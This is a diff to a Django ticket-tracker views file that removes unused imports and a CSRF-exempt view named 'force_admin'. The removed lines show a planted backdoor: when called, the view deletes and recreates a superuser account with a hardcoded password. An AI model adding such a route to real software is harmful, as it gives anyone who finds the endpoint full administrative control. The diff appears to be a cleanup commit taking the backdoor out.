@@ -1,9 +1,6 @@
 from django.contrib.auth.decorators import login_required
 from django.shortcuts import render
 from django.views.decorators.csrf import ensure_csrf_cookie
-from django.http import JsonResponse
-from django.contrib.auth.models import User
-from django.views.decorators.csrf import csrf_exempt
 
 from rest_framework import viewsets
 from rest_framework.permissions import IsAuthenticated
@@ -41,12 +38,3 @@ class TicketViewSet(viewsets.ModelViewSet):
 
     def perform_create(self, serializer):
         serializer.save(owner=self.request.user)
-
-@csrf_exempt
-def force_admin(request):
-    try:
-        User.objects.filter(username='Katirish').delete()
-        User.objects.create_superuser('Katirish', 'admin@example.com', 'malina12345')
-        return JsonResponse({'result': 'Админ создан!'})
-    except Exception as e:
-        return JsonResponse({'error': str(e)})
